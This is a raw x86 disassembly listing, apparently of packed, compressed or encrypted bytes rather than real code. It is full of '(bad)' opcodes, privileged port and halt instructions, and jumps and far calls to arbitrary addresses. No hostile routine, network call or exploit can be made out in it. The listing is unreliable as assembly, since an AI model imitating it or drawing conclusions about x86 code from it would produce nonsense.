  4062e0:	fdivr  DWORD PTR [esi-0x5e79eb40]
  4062e6:	stc    
  4062e7:	pop    ds
  4062e8:	xchg   esi,eax
  4062e9:	or     DWORD PTR [ebp-0x24],eax
  4062ec:	scas   eax,DWORD PTR es:[edi]
  4062ed:	jo     0x4062a4
  4062ef:	jb     0x40630f
  4062f1:	pop    ebx
  4062f2:	jmp    0xf9df:0xf1fe1f68
  4062f9:	push   0x8e606645
  4062fe:	out    dx,eax
  4062ff:	aaa    
  406300:	arpl   bx,bx
  406302:	hlt    
  406303:	jo     0x406303
  406305:	test   al,0x94
  406307:	jbe    0x406346
  406309:	sbb    esp,DWORD PTR [esi+esi*8]
  40630c:	daa    
  40630d:	stos   DWORD PTR es:[edi],eax
  40630e:	dec    esp
  40630f:	pop    ebx
  406310:	mov    esi,0x19504a5f
  406315:	or     ch,ah
  406317:	ins    DWORD PTR es:[edi],dx
  406318:	adc    eax,esp
  40631a:	sub    edx,DWORD PTR ds:0xfe2793d0
  406320:	mov    fs,esi
  406322:	mov    ecx,0x1a1c48fc
  406327:	mov    ?,esi
  406329:	(bad)  
  40632a:	and    BYTE PTR [esi-0x639679b2],dh
  406330:	mov    edx,0xd63cf122
  406335:	xor    eax,0xcad09811
  40633a:	jmp    FWORD PTR [edx+ebp*8+0x78]
  40633e:	push   es
  40633f:	out    0x7a,eax
  406341:	sub    eax,0x8f210b9c
  406346:	dec    edi
  406347:	div    cl
  406349:	scas   al,BYTE PTR es:[edi]
  40634a:	cmp    eax,edi
  40634c:	add    bl,BYTE PTR [edx]
  40634e:	daa    
  40634f:	and    eax,0xd47beb4d
  406354:	pop    edi
  406355:	(bad)  
  406356:	mov    esp,DWORD PTR [ebx-0x759dc8ed]
  40635c:	xlat   BYTE PTR ds:[ebx]
  40635d:	add    eax,0x6ec0f8a2
  406362:	jle    0x4063c8
  406364:	sbb    BYTE PTR [edx+0x52054edf],cl
  40636a:	push   es
  40636b:	xchg   edi,eax
  40636c:	push   esp
  40636d:	leave  
  40636e:	icebp  
  40636f:	xor    BYTE PTR [ebx-0x71c5c587],cl
  406375:	fadd   DWORD PTR fs:[ecx-0x18]
  406379:	lods   al,BYTE PTR ds:[esi]
  40637a:	aad    0xa3
  40637c:	je     0x40635d
  40637e:	test   al,0x9c
  406380:	ret    0x4289
  406383:	out    0xdb,al
  406385:	repnz dec esp
  406387:	xchg   BYTE PTR [edi],cl
  406389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40638a:	cwde   
  40638b:	cmp    al,0x6d
  40638d:	aaa    
  40638e:	into   
  40638f:	shl    DWORD PTR [esi],cl
  406391:	push   esi
  406392:	ins    DWORD PTR es:[edi],dx
  406393:	int3   
  406394:	xchg   ebp,eax
  406395:	pop    ecx
  406396:	mov    ecx,0xb5c77395
  40639b:	fs add al,0xbe
  40639e:	lahf   
  40639f:	xchg   DWORD PTR [edx-0x264f2caf],esp
  4063a5:	cld    
  4063a6:	fisub  WORD PTR [eax]
  4063a8:	push   ebp
  4063a9:	ror    BYTE PTR [ecx+eax*2+0x7f],cl
  4063ad:	add    al,0xb7
  4063af:	push   esp
  4063b0:	fisub  DWORD PTR [edi-0x2a]
  4063b3:	or     dh,ch
  4063b5:	jle    0x4063a0
  4063b7:	mov    cl,0x77
  4063b9:	xchg   BYTE PTR [edx-0x66016c48],dl
  4063bf:	scas   al,BYTE PTR es:[edi]
  4063c0:	xchg   esi,eax
  4063c1:	rcl    BYTE PTR ds:0xfee04377,0x14
  4063c8:	test   cl,cl
  4063ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063cb:	add    DWORD PTR [edx-0x38],ecx
  4063ce:	inc    eax
  4063cf:	mov    WORD PTR [ebx-0x67cb0a68],es
  4063d5:	push   edx
  4063d6:	pushf  
  4063d7:	dec    edx
  4063d8:	pusha  
  4063d9:	daa    
  4063da:	pop    edi
  4063db:	cmp    al,0xa9
  4063dd:	mov    ds:0xb6cfccd0,eax
  4063e2:	pop    edi
  4063e3:	inc    edx
  4063e4:	xor    al,0x4a
  4063e6:	mov    WORD PTR [ebx+0x1e],?
  4063e9:	mov    ebp,0x9377e4f5
  4063ee:	data16 rcr al,cl
  4063f1:	xchg   ebp,eax
  4063f2:	data16 and BYTE PTR [eax-0x63],dh
  4063f6:	xor    eax,0x82ad34f4
  4063fb:	(bad)
  4063fe:	es pop eax
  406400:	sbb    eax,0x7a2858d4
  406405:	stos   DWORD PTR es:[edi],eax
  406406:	mov    ebp,0x83fa2ff8
  40640b:	jne    0x4063d7
  40640d:	pop    ebx
  40640e:	push   ss
  40640f:	push   esi
  406410:	jmp    0x8d3c:0xf5a57a63
  406417:	add    al,0x6b
  406419:	mov    ch,0xc8
  40641b:	sbb    al,0x48
  40641d:	retf   0x5f3a
  406420:	mov    eax,0x3ce6113c
  406425:	fidivr WORD PTR [eax+0x1117c9df]
  40642b:	mov    al,0x99
  40642d:	pusha  
  40642e:	cmp    dl,ch
  406430:	mov    cl,dl
  406432:	ficom  DWORD PTR [edx-0x23]
  406435:	int3   
  406436:	cmp    eax,0x6ba9adad
  40643b:	xor    BYTE PTR [ecx-0x21963487],cl
  406441:	arpl   dx,dx
  406443:	std    
  406444:	inc    eax
  406445:	(bad)  
  406446:	scas   eax,DWORD PTR es:[edi]
  406447:	sub    dh,BYTE PTR [edx+edi*8]
  40644a:	shl    bl,cl
  40644c:	rcl    DWORD PTR [edi-0x7d],0x74
  406450:	lahf   
  406451:	add    bl,BYTE PTR [eax-0x24]
  406454:	xchg   edi,eax
  406455:	out    dx,al
  406456:	in     eax,0x69
  406458:	mov    WORD PTR [edi-0x1f],?
  40645b:	inc    eax
  40645c:	jmp    0x40641f
  40645e:	xchg   ecx,eax
  40645f:	mov    ecx,ds
  406461:	imul   edi,DWORD PTR [esi+0x4976965d],0x3714bdcd
  40646b:	in     al,0xbe
  40646d:	mov    WORD PTR [ebx],?
  40646f:	ja     0x406437
  406471:	idiv   edi
  406473:	(bad)  
  406475:	push   esp
  406476:	mov    BYTE PTR ds:0x25203711,al
  40647c:	ja     0x406481
  40647e:	int3   
  40647f:	dec    esp
  406480:	cmp    al,0x59
  406482:	pop    edi
  406483:	push   0xc86c8661
  406488:	imul   esp,DWORD PTR [ecx+0x40f54206],0xfffffffd
  40648f:	ja     0x406477
  406491:	pop    ss
  406492:	test   BYTE PTR [esp+ecx*2],ch
  406495:	div    ah
  406497:	fimul  WORD PTR [ecx+0x12]
  40649a:	loopne 0x406485
  40649c:	lods   al,BYTE PTR ds:[esi]
  40649d:	push   0x5b
  40649f:	mov    ds:0xd13cea86,al
  4064a4:	dec    ebx
  4064a5:	mov    edx,0x9c3bff01
  4064aa:	ret    
  4064ab:	imul   esi,DWORD PTR [ebx],0x58a322a7
  4064b1:	inc    ebx
  4064b2:	hlt    
  4064b3:	clc    
  4064b4:	or     al,0x66
  4064b6:	xlat   BYTE PTR ds:[ebx]
  4064b7:	test   DWORD PTR [edi+0x7f],edx
  4064ba:	fadd   DWORD PTR [esi-0x5d]
  4064bd:	out    0xa8,eax
  4064bf:	lods   al,BYTE PTR ds:[esi]
  4064c0:	mov    ds:0x3614e1e2,al
  4064c5:	addr16 push es
  4064c7:	and    eax,0xfc8c55f
  4064cc:	shl    DWORD PTR [ecx+esi*2+0x54],1
  4064d0:	ss js  0x406540
  4064d3:	mov    ds:0x808f55,eax
  4064d8:	dec    ebp
  4064d9:	retf   
  4064da:	jns    0x4064da
  4064dc:	push   ebx
  4064dd:	push   ss
  4064de:	push   edx
  4064df:	xchg   DWORD PTR [eax],edi
  4064e1:	imul   esi,DWORD PTR [ecx],0x618288af
  4064e7:	iret   
  4064e8:	dec    edi
  4064e9:	test   eax,0xa3622d7d
  4064ee:	or     eax,DWORD PTR [edx+0x3fd74a56]
  4064f4:	inc    ebx
  4064f5:	dec    ebx
  4064f6:	cmp    al,0x91
  4064f8:	jg     0x406555
  4064fa:	arpl   WORD PTR [edx+esi*1],si
  4064fd:	push   ebx
  4064fe:	frstor [eiz*1-0x648f8959]
  406505:	sbb    al,0x9e
  406507:	fcom   QWORD PTR [edx]
  406509:	mov    edi,ss
  40650b:	jmp    0xdda0:0xbe48d52b
  406512:	call   ecx
  406514:	fsubp  st(4),st
  406516:	and    eax,DWORD PTR [edx+eiz*8-0x1f5821d3]
  40651d:	pop    ebp
  40651e:	hlt    
  40651f:	and    eax,eax
  406521:	shl    DWORD PTR [ebx-0x7df183f0],1
  406527:	xchg   dl,bh
  406529:	pop    ebp
  40652a:	cdq    
  40652b:	sbb    ebx,esp
  40652d:	push   ecx
  40652e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40652f:	iret   
  406530:	addr16 mov ebp,esp
  406533:	daa    
  406534:	cmp    edx,DWORD PTR [edi+edx*8]
  406537:	ds leave 
  406539:	fcmovnbe st,st(3)
  40653b:	mov    edi,0xc53d0315
  406540:	xchg   esi,eax
  406541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406542:	cmova  edx,DWORD PTR [esi-0x63139461]
  406549:	mov    al,0xd0
  40654b:	stos   BYTE PTR es:[edi],al
  40654c:	ins    DWORD PTR es:[edi],dx
  40654d:	imul   esp,DWORD PTR [ebx+esi*1],0xffffff96
  406551:	pop    edi
  406552:	mov    esp,0xc280798b
  406557:	adc    eax,0x57433323
  40655c:	cdq    
  40655d:	js     0x406536
  40655f:	adc    bh,bl
  406561:	repz loop 0x406562
  406564:	add    BYTE PTR [ecx+0x44198c91],0xf1
  40656b:	xchg   ecx,eax
  40656c:	in     eax,0x60
  40656e:	sbb    DWORD PTR [ecx-0x1a],eax
  406571:	leave  
  406572:	pop    esi
  406573:	outs   dx,DWORD PTR ds:[esi]
  406574:	popa   
  406575:	test   DWORD PTR ds:[edi],ebp
  406578:	out    0xf2,al
  40657a:	ins    DWORD PTR es:[edi],dx
  40657b:	push   edx
  40657c:	pop    ss
  40657d:	daa    
  40657e:	mov    eax,0xef16dcac
  406583:	out    dx,eax
  406584:	in     al,dx
  406585:	sbb    DWORD PTR [ebx+edi*4+0x24],eax
  406589:	jge    0x4065af
  40658b:	mov    al,ds:0x9c896b46
  406590:	adc    eax,0xffc95807
  406595:	ins    BYTE PTR es:[edi],dx
  406596:	retf   
  406597:	jle    0x4065dd
  406599:	sub    DWORD PTR [edx],ebx
  40659b:	add    DWORD PTR [eax-0x5c],edi
  40659e:	sub    DWORD PTR [edx+0x5b],0xffffffd3
  4065a2:	add    ecx,0x61b1b0dc
  4065a8:	sbb    bl,BYTE PTR [edi+0x548e22ef]
  4065ae:	icebp  
  4065af:	jge    0x406562
  4065b1:	mov    BYTE PTR [edi],bl
  4065b3:	mov    esp,0xb0926b
  4065b8:	shl    DWORD PTR ds:0x7d1f19e8,0x68
  4065bf:	sbb    DWORD PTR [edx+0x41],ebp
  4065c2:	loopne 0x40654d
  4065c4:	and    eax,0x422a8c07
  4065c9:	fcmove st,st(3)
  4065cb:	dec    edx
  4065cc:	(bad)  
  4065cd:	xchg   ebp,eax
  4065ce:	pop    esp
  4065cf:	fsubr  QWORD PTR [ebx-0x34]
  4065d2:	xchg   ecx,eax
  4065d3:	or     BYTE PTR cs:[eax-0x2ef366dd],0xfc
  4065db:	pop    edx
  4065dc:	dec    ecx
  4065dd:	mov    edx,0xf3912a1e
  4065e2:	shr    BYTE PTR [edi-0x35],1
  4065e5:	cdq    
  4065e6:	jl     0x4065e6
  4065e8:	mov    edx,0xac30fe1f
  4065ed:	mov    bl,0xcc
  4065ef:	or     eax,edx
  4065f1:	stc    
  4065f2:	and    DWORD PTR [ebx+esi*2],0xffffffa1
  4065f6:	sub    ebx,DWORD PTR ss:[edx+0x5f]
  4065fa:	or     al,0x59
  4065fc:	mov    ebp,0xd33b71c8
  406601:	mov    dl,BYTE PTR [edi+0x16982f31]
  406607:	lock ja 0x40661c
  40660a:	jae    0x4065c0
  40660c:	imul   eax,ecx,0x20
  40660f:	mov    esi,0x3f22bf88
  406614:	fwait
  406615:	mov    BYTE PTR [edi-0x65],ah
  406618:	mov    bh,0x8f
  40661a:	xor    al,BYTE PTR [ebx+edx*2]
  40661d:	jle    0x406611
  40661f:	dec    ebx
  406620:	adc    DWORD PTR [edi+ecx*8+0xd],0xffffffb9
  406625:	ret    0x5c71
  406628:	call   0x17d3bba7
  40662d:	xor    BYTE PTR [edx],0xa3
  406630:	jle    0x40665a
  406632:	push   0x94da89b3
  406637:	call   0xd8aea4d1
  40663c:	jb     0x40667b
  40663e:	div    ecx
  406640:	xchg   ebp,eax
  406641:	jno    0x406622
  406643:	test   DWORD PTR [ebp+0x30],ebx
  406646:	(bad)  
  406648:	test   ch,dl
  40664a:	and    al,cl
  40664c:	das    
  40664d:	outs   dx,DWORD PTR ds:[esi]
  40664e:	repz xchg edi,eax
  406650:	lea    ebp,[ecx+eax*8+0x34]
  406654:	ror    DWORD PTR [esi+0x67dd69d1],1
  40665a:	push   ebp
  40665b:	push   es
  40665c:	and    DWORD PTR [eax-0x20],ecx
  40665f:	js     0x40664d
  406661:	leave  
  406662:	sbb    BYTE PTR [edi+esi*2],al
  406665:	loop   0x40666f
  406667:	jnp    0x40667e
  406669:	push   ss
  40666a:	daa    
  40666b:	shl    BYTE PTR [edx],cl
  40666d:	push   0xffffff8f
  40666f:	bound  ebx,QWORD PTR [edi+0x0]
  406672:	mov    bh,0x25
  406674:	call   0xcce7:0x863c49ea
  40667b:	fimul  WORD PTR [eax]
  40667d:	inc    ecx
  40667e:	sub    ebp,eax
  406680:	rcl    DWORD PTR [edx+0x30598913],0xd3
  406687:	pop    ebx
  406688:	pop    edi
  406689:	xlat   BYTE PTR ds:[ebx]
  40668a:	xor    ebx,DWORD PTR [esi+0x62]
  40668d:	dec    eax
  40668e:	fnstcw WORD PTR ds:[edx+0x3b73f869]
  406695:	loope  0x40664e
  406697:	inc    ecx
  406698:	push   cs
  406699:	ret    0x5497
  40669c:	pop    ecx
  40669d:	test   al,0x7d
  40669f:	ja     0x406716
  4066a1:	xor    eax,0x44420815
  4066a6:	jp     0x4066c3
  4066a8:	loope  0x406690
  4066aa:	test   DWORD PTR [edx+0x303434b4],eax
  4066b0:	mov    esi,0x74aec220
  4066b5:	retf   0xcd8a
  4066b8:	aas    
  4066b9:	push   ebp
  4066ba:	lahf   
  4066bb:	fwait
  4066bc:	scas   al,BYTE PTR es:[edi]
  4066bd:	fbstp  TBYTE PTR [edi-0x105791c5]
  4066c3:	mov    ebp,0xe553c1c3
  4066c8:	into   
  4066c9:	and    ch,al
  4066cb:	add    esi,DWORD PTR [edi+0x2b42885]
  4066d1:	mov    edi,0x2dcc5700
  4066d6:	rcl    DWORD PTR [ebp-0x24],0x99
  4066da:	out    dx,eax
  4066db:	cwde   
  4066dc:	mov    ds:0x43d983f2,eax
  4066e1:	and    edi,DWORD PTR [eax+0x7c1914bc]
  4066e7:	add    BYTE PTR [edx],cl
  4066e9:	xchg   ebx,eax
  4066ea:	jl     0x406732
  4066ec:	add    DWORD PTR [edx],0xa34d6291
  4066f2:	nop
  4066f3:	mov    edi,0xc2ad7c9c
  4066f8:	jmp    0x4066a4
  4066fa:	jmp    0x4066f3
  4066fc:	push   cs
  4066fd:	jl     0x40673f
  4066ff:	inc    edx
  406700:	std    
  406701:	inc    DWORD PTR [ecx+0x5f78aae3]
  406707:	mov    cl,0xee
  406709:	test   al,0x9b
  40670b:	adc    ecx,edx
  40670d:	out    0xc9,eax
  40670f:	ficomp WORD PTR [edi+0x6dc724e3]
  406715:	xchg   edx,eax
  406716:	and    ecx,DWORD PTR [edi]
  406718:	pop    edx
  406719:	(bad)
  40671d:	arpl   ax,cx
  40671f:	sub    al,0xb
  406721:	xor    eax,0xccf7e861
  406726:	les    ebp,FWORD PTR [edx-0x2]
  406729:	aad    0x5b
  40672b:	fmul   QWORD PTR [ebp+0x74]
  40672e:	pop    esp
  40672f:	xor    eax,0x496ffd48
  406734:	mov    ds:0xbb31da7e,al
  406739:	cmp    eax,0x1dce2bb3
  40673e:	test   al,0x17
  406740:	dec    ebp
  406741:	pusha  
  406742:	add    eax,0xda0673b1
  406747:	shr    DWORD PTR [edx-0x3d813348],cl
  40674d:	add    DWORD PTR [ebx-0x2b],ebx
  406750:	loopne 0x4066d9
  406752:	adc    BYTE PTR ds:0x45801f60,0xb2
  406759:	ficom  DWORD PTR ds:[eax+0x6c7e1db2]
  406760:	aaa    
  406761:	(bad)  
  406762:	leave  
  406763:	jnp    0x40670a
  406765:	out    0xf7,eax
  406767:	clc    
  406768:	xchg   esi,eax
  406769:	bound  edx,QWORD PTR [ebx+ebp*4]
  40676c:	xor    ebx,DWORD PTR [edx]
  40676e:	idiv   DWORD PTR [eax-0x2d]
  406771:	jnp    0x22bcb14c
  406777:	sahf   
  406778:	and    edi,edx
  40677a:	outs   dx,DWORD PTR ds:[esi]
  40677b:	push   0x2a88b214
  406780:	rol    DWORD PTR [esi+ecx*1-0x15094a43],0xf5
  406788:	outs   dx,BYTE PTR ds:[esi]
  406789:	jno    0x40676e
  40678b:	test   eax,0xc5c43f0f
  406790:	xor    eax,DWORD PTR [ecx-0x131b8862]
  406796:	or     BYTE PTR [ebx+edi*8+0x74db5d71],al
  40679d:	sub    ebp,0x2295735
  4067a3:	fcom   QWORD PTR [esi+edx*2+0x7d80bcf9]
  4067aa:	or     DWORD PTR [edx],0x86017b8a
  4067b0:	mov    ebp,0x2aef24b2
  4067b5:	(bad)  
  4067b7:	mov    DWORD PTR [edi],edi
  4067b9:	loope  0x4067c3
  4067bb:	inc    eax
  4067bc:	das    
  4067bd:	pop    ebx
  4067be:	repnz lahf 
  4067c0:	mov    ebx,0x1b0edc47
  4067c5:	test   DWORD PTR [ecx+0x4],0x7b339bff
  4067cc:	or     ch,BYTE PTR [eax]
  4067ce:	sub    eax,0x8f91aa35
  4067d3:	pop    edx
  4067d4:	or     al,dh
  4067d6:	cmp    ecx,edi
  4067d8:	out    0x28,al
  4067da:	push   esp
  4067db:	ds push ss
  4067dd:	mov    esi,0x97f767aa
  4067e2:	inc    DWORD PTR [ebx]
  4067e4:	iret   
  4067e5:	xlat   BYTE PTR ds:[ebx]
  4067e6:	test   eax,0x92ea42b4
  4067eb:	jecxz  0x406801
  4067ed:	loope  0x4067f5
  4067ef:	xchg   ecx,eax
  4067f0:	ret    0xc7ab
  4067f3:	add    ebp,DWORD PTR [esi]
  4067f5:	sub    esp,edi
  4067f7:	pop    ss
  4067f8:	push   edx
  4067f9:	in     eax,0x35
  4067fb:	cli    
  4067fc:	sub    DWORD PTR [ebx+0x25],esi
  4067ff:	test   BYTE PTR [ebp-0x15e184d8],bh
  406805:	adc    eax,0x90570f7
  40680a:	adc    DWORD PTR [edx+0x5b],edi
  40680d:	mov    edx,0x94e65110
  406812:	sbb    esp,0x2a
  406815:	cdq    
  406816:	bound  ecx,QWORD PTR [eax]
  406818:	out    0xa0,eax
  40681a:	pop    edx
  40681b:	sbb    esi,0xfffffff2
  40681e:	inc    esp
  40681f:	shr    BYTE PTR [eax],1
  406821:	sub    DWORD PTR [bp+di+0x787c],0xffffffad
  406827:	retf   0xcd2d
  40682a:	mov    bl,0xab
  40682c:	mov    ebp,0x3e999a08
  406831:	lods   eax,DWORD PTR ds:[esi]
  406832:	enter  0x20b4,0xe
  406836:	pop    ebx
  406837:	ins    DWORD PTR es:[edi],dx
  406838:	(bad)  
  406839:	pusha  
  40683a:	ret    0xe345
  40683d:	xor    DWORD PTR ds:0xb9b42248,0x41b53a3
  406847:	les    edi,FWORD PTR [ebp+0x2d0e4923]
  40684d:	mov    ebx,0xe17f4b7e
  406852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406853:	fadd   st(1),st
  406855:	sti    
  406856:	mov    bh,0x86
  406858:	dec    ecx
  406859:	retf   
  40685a:	ret    0x3b01
  40685d:	adc    BYTE PTR [edx+0x64],dh
  406860:	adc    BYTE PTR [edx-0x1db49143],ah
  406866:	or     eax,0x8417730c
  40686b:	mov    esp,0x9632d836
  406870:	fld    DWORD PTR [eax]
  406872:	xchg   ebx,eax
  406873:	pop    edx
  406874:	rcl    BYTE PTR ds:0xe58abbd3,cl
  40687a:	jnp    0x4068f8
  40687c:	pop    ds
  40687d:	push   edx
  40687e:	cld    
  40687f:	add    BYTE PTR ds:0xe47c8c2b,0x4e
  406886:	mov    WORD PTR [edx+0x3ee4c033],?
  40688c:	mov    edi,0x53e81206
  406891:	(bad)  
  406893:	ss ret 0x7c43
  406897:	lock mov al,ds:0xd2db24a2
  40689d:	dec    esp
  40689e:	(bad)  
  40689f:	retf   0x59b6
  4068a2:	sub    eax,0x550f096c
  4068a7:	jl     0x406870
  4068a9:	push   0xffffffaa
  4068ab:	cld    
  4068ac:	inc    ebx
  4068ad:	or     BYTE PTR [ebp-0x6d],ch
  4068b0:	hlt    
  4068b1:	fisub  DWORD PTR [ecx-0x5c9fab4d]
  4068b7:	shl    BYTE PTR [esi+edi*4],0x94
  4068bb:	mov    ecx,0x911438db
  4068c0:	inc    edx
  4068c1:	fucom  st(0)
  4068c3:	outs   dx,BYTE PTR ds:[esi]
  4068c4:	(bad)  
  4068c5:	outs   dx,DWORD PTR ds:[esi]
  4068c6:	add    ecx,DWORD PTR [eax]
  4068c8:	and    ah,dl
  4068ca:	fs fdiv st,st(2)
  4068cd:	bnd jno 0x40687d
  4068d0:	lods   al,BYTE PTR ds:[esi]
  4068d1:	(bad)  
  4068d2:	sub    BYTE PTR [ebx],0x44
  4068d5:	or     ah,BYTE PTR ds:0xb2481c48
  4068db:	ins    DWORD PTR es:[edi],dx
  4068dc:	xchg   BYTE PTR [ecx],al
  4068de:	xchg   edx,eax
  4068df:	js     0x40690a
  4068e1:	push   ecx
  4068e2:	not    BYTE PTR [eax]
  4068e4:	dec    ebx
  4068e5:	push   esi
  4068e6:	call   0x9dc4:0xb094351e
  4068ed:	out    dx,eax
  4068ee:	or     eax,0x7bdb87a3
  4068f3:	dec    edx
  4068f4:	xlat   BYTE PTR ds:[ebx]
  4068f5:	fstp   TBYTE PTR [edi-0xd56b4dc]
  4068fb:	leave  
  4068fc:	ficom  DWORD PTR [edx+0x73be014b]
  406902:	push   es
  406903:	jb     0x406885
  406905:	or     eax,DWORD PTR [esi]
  406907:	ret    0x13dd
  40690a:	add    al,0xa5
  40690c:	(bad)  
  40690e:	cmp    eax,0xfa5165a8
  406913:	push   ecx
  406914:	imul   ebx,esp,0x4578e8b1
  40691a:	cld    
  40691b:	mov    dl,0x5
  40691d:	pop    es
  40691e:	test   DWORD PTR [ecx+0x62],ebx
  406921:	mov    ebx,DWORD PTR [ecx-0x29]
  406924:	xor    eax,0x8113fb6e
  406929:	jl     0x4068d8
  40692b:	xor    bl,BYTE PTR [eax-0x1531a72a]
  406931:	leave  
  406932:	push   0x44
  406934:	popf   
  406935:	push   es
  406936:	ins    BYTE PTR es:[edi],dx
  406937:	mov    eax,ds:0x732fb4b8
  40693c:	push   ds
  40693d:	xor    eax,DWORD PTR [edx-0x80]
  406940:	scas   al,BYTE PTR es:[edi]
  406941:	pop    ebx
  406942:	test   DWORD PTR [ebx+0x61],edx
  406945:	scas   al,BYTE PTR es:[edi]
  406946:	scas   al,BYTE PTR es:[edi]
  406947:	retf   0x5588
  40694a:	push   sp
  40694c:	and    cl,BYTE PTR [edx-0x53]
  40694f:	fst    DWORD PTR [eax-0x7e5f409f]
  406955:	bound  esi,QWORD PTR [esi+0x76]
  406958:	lahf   
  406959:	mov    DWORD PTR [edi-0x48],edx
  40695c:	jo     0x406966
  40695e:	mov    esp,0x1ce4ad11
  406963:	dec    esi
  406964:	mov    eax,DWORD PTR [ebx]
  406966:	leave  
  406967:	adc    al,0x3d
  406969:	pop    edi
  40696a:	shl    DWORD PTR [edx+0x26],cl
  40696d:	jecxz  0x40694e
  40696f:	aaa    
  406970:	xor    eax,0x3ef07d35
  406975:	leave  
  406976:	add    al,0x34
  406978:	mov    edi,ss
  40697a:	pop    eax
  40697b:	jbe    0x406901
  40697d:	jb     0x406935
  40697f:	cmp    ebp,DWORD PTR ds:0x98b9569a
  406985:	arpl   WORD PTR [ebx],ax
  406987:	push   ebx
  406988:	sbb    edx,DWORD PTR [edx-0x2]
  40698b:	(bad)  [esi+0x6d8ee628]
  406991:	ja     0x406977
  406993:	or     esp,esp
  406995:	daa    
  406996:	add    bh,BYTE PTR [edi+0x51]
  406999:	pop    esi
  40699a:	jne    0x40692a
  40699c:	pop    ds
  40699d:	jnp    0x406956
  40699f:	retf   
  4069a0:	inc    ebp
  4069a1:	(bad)  
  4069a3:	idiv   BYTE PTR [edx+0x6ef03e3d]
  4069a9:	jae    0x4069d7
  4069ab:	xlat   BYTE PTR ds:[ebx]
  4069ac:	sar    esp,0x31
  4069af:	mov    ds,edi
  4069b1:	dec    esi
  4069b2:	and    BYTE PTR [ebp+0x2f0dbcb8],al
  4069b8:	push   eax
  4069b9:	outs   dx,BYTE PTR ds:[esi]
  4069ba:	fs pop eax
  4069bc:	push   eax
  4069bd:	xor    ecx,DWORD PTR [eiz*2-0x7c8160fb]
  4069c4:	mov    ch,0x1e
  4069c6:	fstp   TBYTE PTR [edx-0x1aeb1bfc]
  4069cc:	rcl    al,1
  4069ce:	push   edx
  4069cf:	fst    DWORD PTR ds:0xfb7a62b8
  4069d5:	xor    al,0x8d
  4069d7:	loope  0x4069ab
  4069d9:	rcr    DWORD PTR [edx],0x29
  4069dc:	adc    BYTE PTR ds:0x7a83d84d,ch
  4069e2:	mov    dh,BYTE PTR [ecx+0x20]
  4069e5:	aam    0xf6
  4069e7:	into   
  4069e8:	jecxz  0x4069df
  4069ea:	push   ecx
  4069eb:	adc    BYTE PTR [ebp+0x59eaaed3],cl
  4069f1:	mov    ecx,0x1c2274ac
  4069f6:	repz loop 0x406a75
  4069f9:	xor    DWORD PTR [esi+0x22],edx
  4069fc:	add    eax,0xf5402505
  406a01:	sbb    eax,0xdc76575e
  406a06:	dec    esp
  406a07:	sub    DWORD PTR [eax+0x64],edi
  406a0a:	dec    esi
  406a0b:	and    DWORD PTR [ebp+esi*2+0x41],0x8c3ec962
  406a13:	jo     0x4069eb
  406a15:	loop   0x4069ed
  406a17:	pop    ebx
  406a18:	mov    ds:0xa309064d,eax
  406a1d:	add    al,0x10
  406a1f:	stc    
  406a20:	xor    DWORD PTR [esi],ebx
  406a22:	xor    bl,cl
  406a24:	icebp  
  406a25:	mov    al,0x6b
  406a27:	and    al,0x80
  406a29:	dec    ebp
  406a2a:	xor    DWORD PTR [edi],edi
  406a2c:	dec    esp
  406a2d:	pause  
  406a2f:	mov    edx,0x4432255f
  406a34:	mov    al,0x90
  406a36:	pusha  
  406a37:	push   0x6d
  406a39:	lds    ebp,FWORD PTR [edx+0x73d8d347]
  406a3f:	lods   al,BYTE PTR ds:[esi]
  406a40:	addr16 inc esi
  406a42:	or     eax,DWORD PTR [ebx+0x19904208]
  406a48:	scas   eax,DWORD PTR es:[edi]
  406a49:	pushf  
  406a4a:	mov    ds:0x2fab709e,eax
  406a4f:	cmp    BYTE PTR ds:0xc60774bb,dl
  406a55:	pop    eax
  406a56:	inc    esp
  406a57:	aad    0xe5
  406a59:	xchg   ebp,eax
  406a5a:	jge    0x4069dd
  406a5c:	pop    ecx
  406a5d:	pop    es
  406a5e:	hlt    
  406a5f:	dec    eax
  406a60:	mov    ch,0x3b
  406a62:	dec    ebx
  406a63:	pop    DWORD PTR [esi-0x5a]
  406a66:	mov    WORD PTR [ebx-0x2f93f125],gs
  406a6c:	mov    dl,0x66
  406a6e:	sbb    edi,DWORD PTR [ecx]
  406a70:	fcom   QWORD PTR [ebx-0xcbb88b6]
  406a76:	or     DWORD PTR [ebx-0x5ce70352],esi
  406a7c:	ins    DWORD PTR es:[edi],dx
  406a7d:	rol    DWORD PTR [edi],1
  406a7f:	jnp    0x406a77
  406a81:	sbb    BYTE PTR [ebp+edi*8-0x25fd0842],bl
  406a88:	iret   
  406a89:	xor    al,0xd1
  406a8b:	jmp    0x406ad9
  406a8d:	aaa    
  406a8e:	sub    DWORD PTR [esi-0x5aa75241],esp
  406a94:	mov    DWORD PTR [ecx-0x14784b2c],ebx
  406a9a:	lock xlat BYTE PTR ds:[ebx]
  406a9c:	push   esp
  406a9d:	sub    esi,DWORD PTR [esi+0x5]
  406aa0:	ds inc ecx
  406aa2:	test   eax,0x5190311
  406aa7:	popa   
  406aa8:	cli    
  406aa9:	jmp    0x1eab7a83
  406aae:	lods   eax,DWORD PTR ds:[esi]
  406aaf:	lds    esp,FWORD PTR [edx-0x540ffe0a]
  406ab5:	jne    0x406ac8
  406ab7:	push   0x8c1bf496
  406abc:	xchg   edx,eax
  406abd:	sahf   
  406abe:	outs   dx,BYTE PTR ds:[esi]
  406abf:	out    dx,al
  406ac0:	aaa    
  406ac1:	jmp    0xbdc3:0xfa894d83
  406ac8:	aam    0xdd
  406aca:	ret    0xc098
  406acd:	jmp    0x4f5e79ad
  406ad2:	pop    ebx
  406ad3:	call   0x272b:0x2fbf8162
  406ada:	dec    ebx
  406adb:	pop    edx
  406adc:	cmp    eax,0xea097891
  406ae1:	outs   dx,DWORD PTR ds:[esi]
  406ae2:	add    ah,BYTE PTR [esi-0x38c6f5e6]
  406ae8:	dec    ebx
  406ae9:	adc    BYTE PTR [eax-0x6],dl
  406aec:	daa    
  406aed:	ss dec ebp
  406aef:	(bad)  
  406af0:	aas    
  406af1:	shl    BYTE PTR [esi],0xcf
  406af4:	xor    dh,BYTE PTR [edx+0x1f]
  406af7:	jecxz  0x406b6a
  406af9:	dec    esp
  406afa:	fs aas 
  406afc:	pop    esp
  406afd:	sub    DWORD PTR [ebx+0x43],0x6b
